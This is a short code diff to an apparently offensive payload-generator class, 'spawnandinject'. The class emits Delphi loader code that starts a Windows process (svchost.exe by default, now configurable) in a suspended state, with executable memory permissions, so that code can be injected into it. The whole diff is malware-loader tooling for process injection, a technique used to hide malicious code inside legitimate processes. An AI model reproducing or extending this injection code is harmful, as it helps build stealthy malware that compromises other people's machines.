@@ -5,6 +5,10 @@ class spawnandinject:
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
             else:
                 self.memoryPermission = 'PAGE_EXECUTE_READ'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
+        else:
+            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
 
     def imports(self) -> list[str]:
         return ['Classes', 'windows', 'sysutils']
@@ -50,7 +54,7 @@ begin
     si.cb := SizeOf(si);
     ZeroMemory(@pi, SizeOf(pi));
 
-    CreateProcessA(nil, PAnsiChar('c:\\windows\\system32\\svchost.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );
+    CreateProcessA(nil, PAnsiChar('{self.target}'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );
 
     
     {transformers}
